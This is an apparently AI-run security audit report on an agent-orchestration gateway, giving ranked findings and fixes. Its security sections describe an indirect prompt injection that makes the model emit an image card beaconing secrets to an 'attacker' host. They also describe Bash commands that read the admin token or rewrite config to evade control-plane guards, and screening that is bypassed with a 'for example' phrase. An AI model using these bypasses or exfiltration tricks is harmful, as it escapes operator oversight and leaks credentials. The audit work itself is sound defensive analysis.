# Cuttlefish — Full 010_audit Sweep + Orchestration Playtest

**Run date:** 2026-07-10
**Target:** `e3742526/cuttlefish` @ `claude/audit-skills-playtest-4fngtj` (commit `93b0366`)
**Skill pack:** `agent-skills/010_audit/*` @ `claude/audit-skills-playtest-4fngtj`
**Method:** 37 applicable audit skills applied as read-only, evidence-first code audits (9 themed passes, multi-agent), plus a live orchestration playtest driven through vitest against the real route/store/delegation code with injected engines and a bespoke adversarial driver.

> Scope discipline: every finding cites `file:line` that was actually read. Static-only runtime effects are labelled **Likely/Potential**; executed observations are labelled **Confirmed (executed)**. Nothing here was weaponized — defensive analysis only.

---

## 1. Executive summary

Cuttlefish is a local Node/TypeScript monorepo — a gateway daemon (HTTP + WebSocket on `:8888`) that drives real agent CLIs (Claude Code, Codex, Grok, …) inside `node-pty` PTYs and coordinates them as a company of AI employees (COO → managers → reports), with a React/Vite dashboard, connectors (Slack/WhatsApp/email), cron, an orchestration store (better-sqlite3), and a git-backed org defined in YAML.

The **orchestration core is sturdy and well-tested** — 152 scenario tests across onboarding, deletion, intra/inter-department delegation, authority conflicts, and supervisor tiers all pass, and many previously-flagged reliability gaps (status reconciler, connector-health honesty, corruption quarantine, at-most-once email ingest) are already remediated with evident care.

The concentrated risk is at the **trust boundary around the agent it drives**. The shipped default binds to loopback with **auth off**, and the strongest containment controls — content screening, scoped-token confinement, control-plane write/read blocks, the `read_only` reviewer, per-employee `cliFlags` — are each **denylist-shaped and individually bypassable**, and they **compose** into privilege-escalation paths (unauth config write → arbitrary MCP command / dangerous CLI flags → agent runs it). The second theme is **cross-process / cross-lane state**: the persistent scheduler and board writers diff against in-memory state, so a second writer (CLI vs daemon) can silently lose leases, continuations, or tickets.

**Top 10 risks (ranked):**

| # | Finding | Severity | Skill lens |
|---|---------|----------|-----------|
| 1 | Whole privileged API unauthenticated on the shipped loopback default | High | security / security-code |
| 2 | Unauth config write → arbitrary command via MCP custom-server `command` | High | security / security-llm (LLM06) |
| 3 | Per-employee `cliFlags` reach engine argv unfiltered — **confirmed live**: onboarding accepts `--dangerously-skip-permissions` | High | agent-orchestration / security |
| 4 | Control-plane write/secret-read blocks bypassable via `Bash` (reads admin token / edits roster) | High | security-llm (LLM05) / security-code |
| 5 | Content-screening fails open; a "for example" phrase downgrades a destructive verdict; skill-file trust is filename-derived | High | security-llm (LLM01) / dataflow-cascade |
| 6 | `read_only` reviewer profile is prompt-only; reviewer defaults to the implementer's own engine+model (echo review) | High | agent-orchestration / multiagent-consensus |
| 7 | Persistent scheduler persists a blind in-memory delta → cross-process lost update of leases/continuations/queue | High | dataflow-concurrency |
| 8 | `/api/status` green while orchestration runtime is down; connector-send failures swallowed (false success) | High | operator-signal / workflow-gui |
| 9 | Global `uncaughtException` swallowed — daemon kept alive in undefined state; cron overlap guard can wedge a schedule forever | High | reliability / resource-lifecycle |
| 10 | Model-emitted card URLs unvalidated → markdown/image exfiltration side channel; `attach` skips session ownership | High | security-llm (LLM06/LLM02) |

The **negative-space pass (Batch I, §6.5) is where the sharpest risks live** — emergent failures no single lens sees: the mid_pair reviewer is bypassed on every turn after the first (I-2), three subsystems clobber one `transport_meta` column (I-4), two processes mint colliding lease IDs and double-grant a worker (I-5), and a model-emitted `image` card is a zero-click exfil beacon through the renderer (I-3).

**Tally:** ~100 distinct findings across 37 skills — roughly **17 High, ~48 Medium, ~35 Low/Info** — plus a healthy list of controls that held (Section 8).

---

## 2. Skill applicability matrix

**Applied (37):**

| Skill | Applied as | Notes |
|-------|-----------|-------|
| audit-agent-orchestration-code | Batch A | Core lens (supervisor/worker/mid_pair) |
| audit-contract-internalapi | Batch A | session/screening seam |
| audit-contract-crossrepo | Batch A | cuttlefish ↔ @cuttlefish/contracts |
| audit-multiagent-consensus | Batch A | lens on the mid_pair review gate |
| audit-architecture-nodejs | Batch B | ESM/sqlite/config |
| audit-architecture-seam | Batch B | god objects, coupling |
| audit-architecture-drift | Batch B | AGENTS.md router contract as intent |
| audit-invariant-sync | Batch B | replicated sets / schema drift |
| audit-deadcode-cleanup | Batch B | compat shims / stale comments |
| audit-dataflow-concurrency | Batch C | scheduler/board/continuation races |
| audit-dataflow-state-transition | Batch C | checkpoint/dual-lane transitions |
| audit-dataflow-integrity | Batch C | provenance/durability |
| audit-dataflow-temporal | Batch C | leases, stale-hold reimport |
| audit-dataflow-cascade | Batch D | screening fail-open blast radius |
| audit-dataflow-input-output | Batch D | uploads/file-read/email MIME |
| audit-dataflow-pipeline-graph | Batch D | init→engine→artifact→reply coverage |
| audit-recovery-idempotency | Batch D | connector/knowledge retry dup |
| audit-reliability | Batch E | uncaught swallow, startup honesty |
| audit-failsafe-readiness | Batch E | node/pty preflight, pause stalls |
| audit-resource-lifecycle | Batch E | cron overlap, PTY keepalive, disk growth |
| audit-memory-lifecycle | Batch E | bounds (mostly held) |
| audit-dependency-criticality | Batch E | provider/pty SPOFs |
| audit-security | Batch F | auth/trust-boundary/exec sinks |
| audit-security-code | Batch F | authZ, file access, redaction |
| audit-security-nodejs | Batch F | CORS, proto-merge, argv |
| audit-security-llm | Batch G | injection/agency/exfil (OWASP LLM Top 10) |
| audit-security-repo-posture | Batch G | supply chain / workflows |
| audit-security-repo-triage | Batch G | secrets / CI permissions |
| audit-security-vuln-harness | Batch G | confused-deputy hunting lens |
| audit-operator-signal | Batch H | health honesty, failure visibility |
| audit-workflow-gui | Batch H | fake success, stale display |
| audit-design-webapp | Batch H | a11y / IA (static) |
| audit-pipeline-externalapi | Batch H | IMAP/HF/model-CLI boundaries |
| audit-compliance-posture | Batch H | governance honesty |
| audit-performance-profile | Batch H | measure-first hypotheses only |
| audit-negative-space | Batch I | emergent/composition failures |
| audit-playtest-app | Section 7 | live orchestration playtest |

**Not applicable (4), with reason:**

| Skill | Why N/A |
|-------|---------|
| audit-flutter-ios | No Flutter/Dart/iOS surface; repo is Node/TS + React web |
| audit-go-repo-hardening | No Go; the equivalent Node lenses (reliability, resource-lifecycle, security-nodejs) were applied instead |
| audit-security-supabase | No Supabase usage (`grep -ri supabase packages/` → 0 hits); persistence is better-sqlite3 + YAML |
| audit-equation-sourcebase | Not a data/equation/sourcebase stack |

---

## 3. Orchestration core & contracts (Batch A)

**Applicability:** Cuttlefish is a COO→manager→report orchestrator with a real implementer→reviewer (`mid_pair`) gate, engine adapters, and role sessions — the richest surface for the orchestration/consensus/contract lenses.

- **A-F1 — `read_only` reviewer profile is prompt-only; no construction-site restriction. [High, Confirmed]** `gateway/employee-execution.ts:227-232` renders the profile as a *sentence* only; `gateway/mid-pair-orchestrator.ts:410` is its sole consumer (prompt concat); `spawnRoleSession` (`:582-613`) creates the reviewer with `cwd: parentSession.cwd` (the real project) and no tool/permission restriction — directly contradicting the module's own invariant ("Reviewer does not directly mutate repo contents," `mid-pair-orchestrator.ts:11`). *A "read-only" review pass can edit/exec the code it is meant only to assess.* **Fix:** enforce via `disallowedTools`/permission-mode keyed off `reviewerToolProfile`; add a fake-agent test that a reviewer emitting a write tool-call is blocked.
- **A-F2 — Org-YAML `cliFlags` reach engine argv unfiltered; the one guard sits on a different path. [High, Confirmed + executed in §7]** `gateway/org.ts:174` accepts any string array; `gateway/run-web-session.ts:518,718` passes it straight into the engine run; appended after `--disallowedTools` in `engines/claude-interactive-args.ts:34-37` (and `kiro/pi/aider/ollama`). The only denylist (`orchestration/adapter/real-adapter.ts:255-265`) blocks Claude headless flags *only for `claude`* and *only inside `RealProviderAdapter`*, which the gateway interactive path never calls. **Fix:** centralize a per-engine flag denylist on the actual spawn path and validate at `validateEmployeeUpdate`.
- **A-F3 — mid_pair gate trusts the `verdict` string, ignores the reviewer's own `requiredChanges`. [Medium-High, Confirmed]** `mid-pair-orchestrator.ts:251-252` branches only on `verdict.verdict === "approved"`; `employee-execution.ts:197-214` hard-requires only `verdict`. An `approved` verdict carrying non-empty `requiredChanges` (or `confidence:"low"`) still ships `done`. **Fix:** make the gate arithmetic — `approved` requires empty `requiredChanges` and no blocking risk items.
- **A-F4 — Session/screening contracts duplicated across the repo seam and already drifted. [Medium, Confirmed]** Producer `packages/contracts/src/session.ts:14-23` defines `ContentScreeningResult.source: string`; internal `packages/cuttlefish/src/shared/types/sessions.ts:13-31` re-declares it with `source: UntrustedContentSource` (a *narrower* union) and an independent `RunAttachment`, with no import bridging them. **Fix:** single source of truth in `@cuttlefish/contracts` + a cross-package type-parity test.
- **A-F5 — Reviewer diff is a live, shared-workspace `git diff HEAD` with no saved baseline. [Medium, Likely]** `gateway/review-context.ts:56-74`; role children inherit `parentSession.cwd` (`mid-pair-orchestrator.ts:606-608`), so concurrent sessions' changes are attributed to "the implementer." **Fix:** snapshot a baseline ref at implementer start; isolate role children in a worktree (`isolated_worktree` policy already exists in `orchestration/types.ts:10`).
- **A-F6 — Talk `attach`/`engage` skips ownership and any user/tenant check. [Medium, Likely]** `talk/delegate.ts:157-201` — the parent-ownership check is "intentionally SKIPPED"; any talk session can adopt and inject operator-attributed messages into any non-talk session by id. **Fix:** require target owner match or explicit share grant.
- **A-F7 — "Independent" review defaults to the implementer's own engine+model. [Low-Medium, Confirmed]** `mid-pair-orchestrator.ts:436-438` — `primaryEngine = reviewerRole?.override?.engine ?? employee.engine`. Same-family reviewer shares blind spots; agreement is not independent evidence (echo-consensus per audit-multiagent-consensus). **Fix:** default the reviewer to a different model family or mark the review degraded when identical.
- **A-F8 — Failed review passes are overwritten, not retained (progress laundering). [Low-Medium, Medium]** `mid-pair-orchestrator.ts:621-701` mutates pass counters in place with no per-pass history; "approved after 2 rejections" is indistinguishable from "approved first try." **Fix:** append an immutable per-pass record.
- **A-F9 — Reviewer packet truncates the implementer summary with no marker. [Low, Confirmed]** `employee-execution.ts:274` `slice(0,4000)` with no truncation marker or pointer to the full output. **Fix:** add a marker + session-id pointer; prefer the (bounded) diff as primary evidence.

---

## 4. Architecture, drift, invariant-sync, dead code (Batch B)

**Applicability:** pnpm/Turborepo ESM monorepo, hand-rolled `node:http` routing, better-sqlite3 + YAML org, type-only contracts package. AGENTS.md carries an explicit, testable "router file contract" as declared intent.

- **B-INV-001 — Engine-name membership set replicated in 5+ sites across 3 files; canonical source bypassed. [Medium, Confirmed]** `shared/models.ts:43-44` defines canonical `ENGINE_NAMES`, but `shared/config-schema.ts:5` re-declares its own Set, `:178` hard-codes the 10 names inline, and `shared/types/config.ts:138,179` hard-code the union (different order). None import `models.ts`. **Fix:** derive all from `models.ts`; add a drift-guard test.
- **B-AID-001 — Route file hosts domain logic + fs parsing, contradicting the declared router contract. [Medium-High, Confirmed]** `gateway/api/routes/org.ts` (981 lines) defines `resolveCrossRequestRoute`+`chainToRoot` (org-graph routing), `validateBoardAssigneesForDepartment`, `reconcileDepartmentBoardView` (persistence reconcile), and raw `fs.readdirSync(ORG_DIR)` (`:262-266`) — all forbidden in adapter files by AGENTS.md. **Fix:** move service/routing/validation into `org-*` domain modules.
- **B-INV-002 — Orchestration store column lists hand-duplicated across replace/upsert/row-interface/loader; `SELECT *` reads. [Medium, Confirmed structure]** `store-snapshot.ts:79-135, 205-322, 6-56, 339-427` — adding one column is 4-6 coordinated edits and any omission is silent. **Fix:** generate column lists from one manifest per table; assert `pragma table_info` equality.
- **B-ARC-001 — `gateway/org.ts` god object (1283 lines) mixes scan/parse/validate/merge/persist + unrelated `@`-mention parsing. [Medium, Confirmed]** `walkEmployeeYamls`, `parseEmployeeData`, a ~300-line validator, persistence, and `extractMention/extractMentions` all in one file. **Fix:** split into scan/validate/persist + a mentions util.
- **B-INV-003 — Backend PTY key allowlist mirrored by a hand copy in a web "parity guard" that cannot catch backend removals. [Medium, Confirmed]** backend `gateway/pty-ws.ts:7 RAW_KEY_INPUTS`; web test `components/__tests__/cli-keybar.test.tsx:5-9` re-declares the same Set and asserts against the *local copy*. A backend removal still passes the guard and silently drops the keypress. **Fix:** export `RAW_KEY_INPUTS` from a shared module and import on both sides.
- **B-ARC-002 / INV-004 — Web hand-mirrors daemon domain types instead of consuming `@cuttlefish/contracts`. [Medium, Confirmed]** `web/src/lib/kanban/types.ts:9-14` documents a prior same-name/different-values `WorkState` collision; ~10 files sync via "Mirror of…" comments only. **Fix:** promote mirrored types into the contracts package.
- **B-ARCN-001 — Runtime config validator maintained separately from the compile-time config type (DTO drift). [Medium, Confirmed]** `shared/config-schema.ts` is a hand-written validator with its own `FALLBACK_MODES/RETURN_POLICIES/ENGINE_FAILURE_REASONS`; the shape `CuttlefishConfig` (`shared/types/config.ts:95`) is separate. **Fix:** schema-first with inferred type, or a conformance test.
- **B-INV-005 — `live_run_continuations.run_id` in code + ALTER but not in `CREATE_SCHEMA`. [Low, Confirmed]** `store-continuations.ts` uses `run_id`; `store-schema.ts:93-106 CREATE TABLE` omits it (added only via `ensureContinuationRunIdColumn` ALTER `:287-291`). **Fix:** fold settled additive columns into `CREATE_SCHEMA`.
- **B-ARCN-002 — Same module imported both statically and via `await import()` in one file with no cycle to break. [Low, Confirmed]** `gateway/api/routes/org.ts:13` static + `:449,477,533,578,593,624` dynamic imports of `../../org.js`. **Fix:** hoist to the static import.
- **B-ARCN-003 — `process.env` read in ~20 modules outside the config owner. [Low, Confirmed]** 38 reads across non-test src (`shared/paths.ts`, `shared/qdrant.ts`, `gateway/lifecycle.ts`, engines). **Fix:** route through the config/paths owner; lint-forbid elsewhere.
- **B-DEAD-001/002 — Config compat shims run on every load (Codex `contextWindow`, legacy connector strip); a stale "never enforced" comment on `maxToolCalls` which *is* now enforced (`gateway/hook-endpoint.ts:170`). [Low]** **Fix:** sunset the shims once installed homes are migrated; correct the comment.

---

## 5. Dataflow — concurrency, state, integrity, temporal, cascade, I/O, recovery (Batches C & D)

**Store reality:** better-sqlite3 (WAL, `synchronous=NORMAL`). Node is single-threaded, so the real hazards are (a) `await` gaps inside read→write sequences and (b) **multi-writer** cases (cross-process CLI vs daemon; the runtime-swap window). Synchronous SQLite txns are internally safe; the danger is reads taken *outside* the txn/lock.

### Concurrency / state / integrity / temporal (Batch C)
- **C-01 — Persistent scheduler persists a *blind* in-memory delta, never reconciling against the DB. [High, Likely]** `orchestration/persistent-scheduler.ts:98-112` captures `before` from **in-memory** state, then `applySnapshotDelta` (`store-snapshot.ts:155-198`) deletes rows in `before`-but-not-`after` and upserts diffs **without re-reading the DB**. A second writer (cross-process CLI, or the two-connection swap window in `orchestration-runtime-manager.ts:40-42`) has its committed leases/queue rows silently deleted → double-dispatch or dropped work. **Fix:** recompute the delta inside one txn that re-reads authoritative rows, or a version column / single-writer guard.
- **C-02 — `recoverStaleDispatchingContinuations` freshness guard orphans recent continuations after a hard restart. [Medium-High, Confirmed]** `runtime.ts:577-591` skips `updatedAt > now-10min`, and it runs **only** from the constructor (`:150`); the reaper never re-runs it. A continuation <10 min old at crash is stuck `dispatching` forever until a later restart. **Fix:** recover **all** `dispatching` on boot; reserve the age guard for a periodic sweep.
- **C-03 — `markLiveContinuationStateInDb` writes state unconditionally — shutdown-drain races completion. [Medium, Likely]** `store-continuations.ts:164-196` (no precondition, contrast the guarded `claim…:141-154`); `prepareForShutdown` (`runtime.ts:480-483`) races `markLiveContinuationCompleted` (`:557`). Last write wins; a completed run can be recorded `failed`. **Fix:** CAS with an expected-from-state `WHERE`.
- **C-04 — Dual-lane deletes the durable continuation *before* running the lanes. [Medium, Likely]** `orchestration/dual-lane.ts:130` deletes, then runs lanes; the failure path (`:199-215`) never re-queues, so `retryFailedLiveContinuation` returns `not_found`. **Fix:** keep the continuation (`dispatching`) until lanes succeed.
- **C-05 — Checkpoint decision commits the approval, then resumes the session as separate non-durable steps. [Medium, Confirmed]** `gateway/checkpoints.ts:171-213`; a crash between `resolveApproval` and `dispatchWebSessionRun` leaves the checkpoint `approved` but the session `waiting` forever (the reconciler only unsticks `running`). **Fix:** derive resume from the resolved-approval state via a reconciler.
- **C-06 — Dual-lane winner selection is check-then-act with no idempotency; loser worktree double-cleaned. [Medium, Plausible]** `dual-lane.ts:260-309`. **Fix:** compare-and-set on manifest `state`.
- **C-07 — Board full-array overwrite writers bypass the optimistic-merge path; the lock is process-local. [Medium, Plausible]** `gateway/board-service.ts:490-503` vs the API's `mergeBoardTickets` (`:330-394`); `boardLock` is an in-memory `KeyedMutex` (`:90`). A second process (or the watchdog) clobbers concurrent session-tickets. **Fix:** route overwrite writers through the optimistic-merge/atomic-RMW path.
- **C-08 — `transitionRun` evaluates the terminal-state guard on a value read outside the write txn. [Low-Medium, Plausible]** `run-ledger/store.ts:457-497`. **Fix:** read + check + guarded UPDATE in one txn.
- **C-09 — Recovery-requeue re-imports `active` holds from the quarantined DB using their original expiry. [Low-Medium, Likely]** `orchestration/recovery-requeue.ts:102-132` — workers re-blocked by authority reconstructed from a DB the system already declared untrustworthy. **Fix:** re-stamp a fresh short TTL or require operator re-grant.
- **C-10 — Lease heartbeat/expiry is wall-clock with no monotonic guard. [Low, Confirmed]** `orchestration/scheduler.ts:179,207-240,529`. An NTP correction extends or early-expires live leases. **Fix:** monotonic clock for interval math.
- **C-11 — Continuation `runId` stamped in a second statement outside the upsert txn. [Low, Confirmed]** `runtime.ts:231-236` + `store-continuations.ts:99-103`. Crash between → queued continuation with no `run_id`, orphaned from its run-ledger row. **Fix:** pass `runId` into the upsert.

### Cascade / input-output / pipeline / recovery-idempotency (Batch D)
- **D-F1 — Ticket-linked resources reach the engine unscreened (screening parity gap). [High, Confirmed]** `gateway/ticket-dispatch.ts:99-116` resolves ticket `resourcePath`/`resourceUrl` to engine attachments but never calls `screenRunAttachmentsForSession` — contrast the `/api/sessions` path (`api/routes/session-write.ts:93`). A board ticket (which can originate from a connector) has untrusted file content read verbatim by the agent, bypassing the injection bulkhead. **Fix:** screen ticket resources and honor `resolved.blocked` before dispatch.
- **D-F2 — Screening fails open to a heuristic whose "example" downgrade delivers raw destructive text. [High, Confirmed guard]** `gateway/content-screening.ts:317` `reviewer ?? heuristic` (fail-open when no `SECURITY_REVIEWER` exists or it errors); `:154-166` a `destructive_or_exfiltrative` verdict is downgraded to `suspicious_non_destructive` whenever `containsExampleContext` matches (`/\bfor\s+example\b/i`, `/\bdo\s+not\s+run\b/i`); `:182-189` then passes the **raw** text. **Fix:** never let example-context downgrade a destructive/exfiltration verdict; treat a missing LLM reviewer as fail-closed for destructive hits.
- **D-F3 — `skill_file` source auto-allows suspicious content by filename/path confusion. [Medium-High, Confirmed]** `content-screening.ts:99-107` classifies any `skill.md`/`skills.md`/`skills.sh` or `/skills/`-path attachment as `skill_file` → `allow` with span-sanitization skipped (`:153`). **Fix:** derive skill-file trust from operator-controlled provenance, not attacker-supplied basename.
- **D-F4 — LLM screener's JSON verdict is trusted as gating authority (judge injectable). [Medium, Confirmed]** `content-screening.ts:268-287`. **Fix:** combine the model verdict with a deterministic destructive-pattern floor.
- **D-F5 — Connector reply retried without idempotency → duplicate channel message. [Medium, Likely]** `gateway/connector-reply.ts:76-97` retries on any throw (incl. timeout) with no dedupe key. **Fix:** stable dedupe key (session+turn+hash).
- **D-F6 — Knowledge outbox release-on-throw re-emits an already-accepted batch. [Medium, Likely]** `knowledge/outbox-service.ts:66-93`. **Fix:** per-envelope idempotency key.
- **D-F7 — Run-bundle log filter leaks unrelated sessions' `gateway.log` lines. [Medium, Confirmed]** `gateway/run-bundles.ts:162-172` builds needles from `session.title` (user/prompt-derived, may be a common word) and substring-matches the shared log. **Fix:** match structured session-id fields only.
- **D-F8 — Custom-path upload leaves an orphaned artifact + registry row on the "already exists" failure. [Medium-Low, Confirmed]** `gateway/files/uploads.ts:112-146` writes + `insertFile` *before* the existence check that throws. **Fix:** check before write/insert, or compensating cleanup.
- **D-F9 — `/api/files/read` denylist misses `config.yaml`; default (no `fileReadRoots`) permits arbitrary reads. [Medium, Confirmed]** `gateway/files/read-security.ts:75-93, 108-121`. **Fix:** add `config.yaml`/config dir to the denylist; prefer an allowlist default.
- **D-F10 — External-turn fallback advances the anchor to `now()`, dropping later transcript turns. [Low-Medium, Likely]** `gateway/external-turns.ts:282-300`. **Fix:** anchor to the covered timestamp, not now().
- **D-F11 — Run-bundle export is non-atomic. [Low, Confirmed]** `gateway/run-bundles.ts:278-338`. **Fix:** build in a temp dir + atomic rename / `.complete` marker.
- **D-F12 — `fs-browse` default is whole-filesystem free-browse. [Low, Confirmed]** `gateway/fs-browse.ts:54-57` (`roots.length===0 → allow`). **Fix:** default to a safe root when a user header is configured.

---

## 6. Reliability, resource/memory, dependency-criticality; security; operator/GUI/pipeline (Batches E–H)

### Reliability / failsafe / resource / memory / dependency (Batch E)
- **E1 — Global `uncaughtException` swallowed; daemon kept alive in undefined state. [High, Confirmed]** `gateway/process-guards.ts:13-20` logs and explicitly does *not* re-throw/exit; Node's post-`uncaughtException` state is undefined (torn stack, half-written SQLite/board.json/JSONL), yet `getStatus()` still reports running. **Fix:** drain + exit non-zero for a supervisor restart, or scope error boundaries per-turn.
- **E2 — Cron overlap guard wedges a schedule permanently when a run hangs. [High, Confirmed]** `cron/scheduler.ts:65-118` clears `inFlight` only in `.finally`; `runner.ts:54-88` awaits `route` with no timeout. A hung PTY or 6h rate-limit wait leaves `inFlight` set → every future fire logs "skipped: previous run still in flight" forever. **Fix:** bounded wait + forced cancel; alert on expiry.
- **E3 — Provider outage (non-429) on the interactive path has no fallback; single hardcoded Anthropic host. [Medium-High, Confirmed]** `sse-pty-proxy.ts:126,284-303`; fallback engages only via `detectRateLimit` (`sessions/rate-limit-handler.ts:186-303`). A hard outage/DNS/5xx surfaces as a bare 502. **Fix:** classify connection/5xx faults into the same fallback/degraded contract; make the host configurable.
- **E4 — `startDaemon` reports success with no readiness probe. [Medium, Confirmed]** `gateway/lifecycle.ts:178-201` declares success from `child.pid` alone with `stdio:"ignore"`; the detached child can `exit(1)` invisibly. **Fix:** probe port/health after spawn.
- **E5 — `resolveNodeExecutable` proceeds on missing Node ≥24 instead of failing closed. [Medium, Confirmed]** `gateway/lifecycle.ts:24-58` logs "daemon may crash" then spawns anyway → silent crash-loop with E4. **Fix:** fail closed with an install action.
- **E6 — Paused session key blocks queued tasks forever with no timeout. [Medium, Confirmed]** `sessions/queue.ts:97-104` parks on an unbounded promise woken only by `resumeQueue`; a persisted-but-never-resumed pause strands all its tasks. **Fix:** bounded pause + surfaced degraded status.
- **E7 — Operator/connector notifications silently dropped when the connector is down/unconfigured. [Medium, Confirmed]** `gateway/notification-sink.ts:12-28` returns after a warn with no retry/queue — the "someone should notice" signal vanishes exactly when the transport is unhealthy. **Fix:** queue/persist undeliverable notices + reflect in health.
- **E8 — node-pty is warn-and-continue; interactive engines throw per-turn with no preflight. [Medium, Confirmed]** `gateway/daemon-entry.ts:24-29` + `engines/pty-stream.ts:18-26`. **Fix:** preflight → explicit degraded-mode contract.
- **E9 — Model-fallback handoff files grow on disk with no retention. [Low, Confirmed]** `gateway/model-fallback.ts:27-70` (contrast the pruners in `cron/jobs.ts` / `store-recovery.ts`). **Fix:** age/count retention.
- **E10 — Warm-PTY 4h keepalive pins a real `claude` subprocess + its SSE-proxy server. [Low-Medium, Likely]** `engines/pty-lifecycle.ts:13,44-50`; proxy torn down only on PTY exit (`claude-interactive.ts:388-389`). LRU-capped at 8. **Fix:** shorter idle grace / reap proxy at turn-end.
- **E11 — Stuck upstream socket reaped only after a 1-hour idle timeout. [Low, Confirmed]** `sse-pty-proxy.ts:14,305-308`. **Fix:** turn-level heartbeat.
- **E12 — Unknown-reset rate-limit wait parks a session up to 6h. [Low, Confirmed]** `sessions/rate-limit-handler.ts:306-338`; compounds E2. **Fix:** shorter/configurable ceiling + operator signal.
- **Memory (audit-memory-lifecycle):** no confirmed retention leak — scrollback 256 KB ring, `STREAM_MAP_CAP=128`/`SESSION_MAP_CAP=512` LRU, Slack cache 1000+TTL, scheduler pruning all bounded (recorded as a held-control).
- **Dependency-criticality:** the interactive Anthropic path is a SPOF for non-429 outages (E3); node-pty and Node≥24 are warn-and-continue rather than fail-closed (E5/E8).

### Security — core / code / node.js (Batch F)
> Deployment split: the shipped default is **loopback bind with auth OFF** (`shouldRequireGatewayAuth` returns `isNetworkHost(host)` → false for `127.0.0.1`, `auth.ts:193-201`). "Unauthenticated" below = reachable by any local process, or a browser-driven SSRF that reaches loopback; network bind + pairing widens several items.

- **F-01 — Entire privileged API unauthenticated on the shipped default. [High, Confirmed]** `auth.ts:193-201` + `server/auth-gate.ts:57`. Every route — `/api/config` write, `/api/system`, `/api/files/read`, session spawn, orchestration — reachable with no credential. **Fix:** require auth (or an explicit `insecureAllow…` flag) regardless of interface.
- **F-02 — Config write → arbitrary command execution via MCP custom-server `command`. [High, Confirmed sink]** `mcp/resolver.ts:98-117,182` copies `config.mcp.custom.<name>.command`+`args` verbatim into the MCP config the engine spawns; `command` survives `sanitizeConfigForApi`/`deepMerge`. With F-01, an unauth `PUT /api/config` plants an arbitrary binary that runs on the next agent turn. **Fix:** allowlist/validate MCP commands.
- **F-03 — `Bash` reading the admin token evades both control-plane guards via absolute path. [High, Confirmed]** `hook-endpoint.ts:52` blocks only `toolName==="Read"`; `command-policy.ts:18 HOME_SECRET_PATH` matches only `~`/`$HOME` literal forms, not an absolute `/home/<user>/.cuttlefish/gateway.json`. `Bash: cat /home/<user>/.cuttlefish/gateway.json` → `allow` → admin bearer read into the agent's context. **Fix:** resolve realpath in command-policy; apply the secret-read block to Bash-class tools.
- **F-04 — Manager identity is body-claimed in orchestration routes (privilege escalation). [High, Confirmed missing binding]** `api/routes/org.ts:487` binds identity via `isManagerNameAuthorizedForPrincipal`, but `orchestration-routes.ts:320,667-670` call only `authorizeManagerScope` with `body.managerName`, which short-circuits `ok:true` for any `executive` rank (`manager-auth.ts:45`). A low-rank session token can set `managerName` to an executive's and drive holds/requeues it doesn't own. **Fix:** bind `managerName` to the principal on every orchestration route.
- **F-05 — `/api/auth/bootstrap` grants a full admin browser session to any loopback caller with no secret. [Medium-High, Confirmed]** `api/routes/auth.ts:42-55` sets the admin cookie (`Max-Age=31536000`) for any loopback socket+Host. **Fix:** require the gateway token / local-owner proof; shorten cookie lifetime.
- **F-06 / F-07 — `/api/files/read` and `fs-browse` are default-open (denylist / empty-roots-allow).** (see D-F9 / D-F12) **[Medium, Confirmed]**
- **F-08 — Scoped agent-token confinement is a denylist; several sensitive routes reachable. [Medium, Confirmed]** `scoped-token.ts:53-88` — `/api/files/read`, `/api/fs`, `/api/knowledge`, `/api/artifacts`, `/api/email` read are not listed, so a prompt-injected session token reaches them. **Fix:** allow-list for scoped tokens + a default-deny regression test.
- **F-10 — Per-employee `cliFlags` appended raw to engine argv (argument injection). [Medium, Confirmed]** `engines/claude-interactive-args.ts:37` (after the security flags). Amplifies F-02. (Executed reproduction in §7.) **Fix:** allowlist cliFlags.
- **F-11 — Control-plane write block uses `path.resolve`, not realpath (symlink bypass). [Medium, Likely]** `hook-endpoint.ts:16-20` (the sibling *read* path *does* realpath — inconsistent). **Fix:** realpath both sides.
- **F-12 — CORS reflects same-host Origin with `Allow-Credentials: true`. [Medium network / Low loopback, Likely]** `server/http-static.ts:25-44`. **Fix:** explicit origin allowlist; never reflect+credentials on a network bind.
- **F-13/F-14/F-15 — Regex-denylist secret redaction misses high-entropy secrets (`shared/redact.ts:19-28`); 30-day scoped tokens with no revocation (`scoped-token.ts:19`); `deepMerge` lacks `__proto__` key filtering (`config-sanitize.ts:77-112`, proto-pollution *Plausible* not Confirmed). [Low-Medium]**
- **Held controls:** `crypto.timingSafeEqual` compares, `randomBytes(32)`/`randomInt` tokens, argv-array spawns with no `shell:true`, `/ws`+`/ws/pty` rebinding/Origin/HMAC guards, Slack socket-mode (no inbound webhook), body bounds (hook 64 KiB, JSON 1 MiB) — all verified sound.

### Security — LLM / repo-posture / triage / vuln-harness (Batch G, OWASP LLM Top 10)
- **G-01 — Control-plane write protection bypassable via Bash (confused deputy). [High, Confirmed | LLM05]** `hook-endpoint.ts:44-49` blocks only Write/Edit/NotebookEdit; `command-policy.ts:29-54` has no rule for writing `~/.cuttlefish/{config.yaml,org,cron,skills}`. `echo … >> ~/.cuttlefish/config.yaml` / `sed -i … org/<emp>.md` → `allow`. Self-modification of roster/config/cron/skills with no approval. **Fix:** detect write-redirects/`tee`/`sed -i`/`cp`/`mv` to control-plane roots, or block by resolved path regardless of tool.
- **G-02 — Model-emitted card URLs unvalidated → markdown/image exfiltration side channel. [High, Confirmed | LLM06]** `talk/card-validate.ts:104-208` validates only `isString(src/url)` — no scheme/host allowlist; `orchestrator-persona.ts:64-76` instructs the model to push `link`/`image` cards; the web client renders `<img src>` and auto-fetches. An indirect injection (a foreign attached session's output, `delegate.ts:157-159`) makes it emit `{"type":"image","src":"https://attacker/log?d=<secret>"}`. **Fix:** allowlist/proxy `src`/`url`; disable remote-image auto-load in the Talk renderer.
- **G-03 — Injection filter trivially downgraded by an "example" phrase. [High, Confirmed | LLM01]** (see D-F2) `content-screening.ts:50-62,154-166`. **Fix:** don't let an example cue override a destructive/exfiltration verdict.
- **G-04 — Email auto-ingest computes screening but dispatches the *unsanitized* prompt. [Medium-High, Confirmed | LLM01]** `gateway/server.ts:425-459` honors `screened.blocked` but dispatches `buildEmailIngestPrompt(message)` — not `screened.workerText` — so span-sanitization is a no-op on the email path (the connector path *does* use `workerText`, `server.ts:500`). **Fix:** dispatch `screened.workerText` on the email path.
- **G-05 — MCP servers pulled from npm unpinned at `@latest`/floating (supply chain). [Medium-High, Confirmed | LLM03/05]** `mcp/resolver.ts:64,70,81,93` (`@playwright/mcp@latest`, `…puppeteer`, `brave-search-mcp`, `…fetch` unpinned) launched via `npx -y` with full tool privileges. **Fix:** pin exact, integrity-hashed versions.
